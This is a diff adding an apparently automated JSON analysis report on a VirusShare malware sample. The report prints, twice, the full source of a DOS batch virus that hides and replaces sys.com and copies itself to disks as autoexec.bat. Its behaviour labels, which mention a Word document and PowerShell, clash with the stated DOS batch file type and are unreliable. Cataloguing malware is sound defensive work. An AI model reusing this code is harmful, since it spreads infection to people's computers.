@@ -1,0 +1,55 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened",
+            "command": "May run PowerShell commands"
+        },
+        "macro": "@echo off\nrem Angus Neborg-SO.HT.AI.KS\nif not \"%0\"==\"sys\" goto inboot\nattrib -H %windir%\\command\\sys.old>nul\nren %windir%\\command\\sys.old sys.com>nul\n%windir%\\command\\sys.com %1 %2\nren %windir%\\command\\sys.com sys.old>nul\nattrib +H %windir%\\command\\sys.old>nul\nif \"%1\"==\"\" goto end\nif \"%1\"==\"/?\" goto end\nif not \"%2\"==\"\" shift\ncopy /y %windir%\\command\\sys.bat %1\\autoexec.bat>nul\ncopy /y %windir%\\command\\attrib.exe %1\\attrib.exe>nul\ngoto end\n:inboot\nif not exist %windir%\\command\\sys.com goto end\nif exist %windir%\\command\\sys.old goto end\nren %windir%\\command\\sys.com sys.old>nul\nattrib +H %windir%\\command\\sys.old>nul\ncopy /y %0 %windir%\\command\\sys.bat>nul\n:end"
+    },
+    "filename": "VirusShare_208ec8f7ed5bc840a42eddbc902a97a3",
+    "filesize": 687,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "208ec8f7ed5bc840a42eddbc902a97a3",
+        "sha1": "6e1970e22309043ba1957aa90d14f7335579b3b4",
+        "sha256": "61e3213e8ae5aea1b4b96fd68730cd3e1e25b85755f206da13860cfde6845f69"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "rem Angus Neborg-SO.HT.AI.KS",
+            "if not \"%0\"==\"sys\" goto inboot",
+            "attrib -H %windir%\\command\\sys.old>nul",
+            "ren %windir%\\command\\sys.old sys.com>nul",
+            "%windir%\\command\\sys.com %1 %2",
+            "ren %windir%\\command\\sys.com sys.old>nul",
+            "attrib +H %windir%\\command\\sys.old>nul",
+            "if \"%1\"==\"\" goto end",
+            "if \"%1\"==\"/?\" goto end",
+            "if not \"%2\"==\"\" shift",
+            "copy /y %windir%\\command\\sys.bat %1\\autoexec.bat>nul",
+            "copy /y %windir%\\command\\attrib.exe %1\\attrib.exe>nul",
+            "goto end",
+            ":inboot",
+            "if not exist %windir%\\command\\sys.com goto end",
+            "if exist %windir%\\command\\sys.old goto end",
+            "ren %windir%\\command\\sys.com sys.old>nul",
+            "attrib +H %windir%\\command\\sys.old>nul",
+            "copy /y %0 %windir%\\command\\sys.bat>nul",
+            ":end"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.392009",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
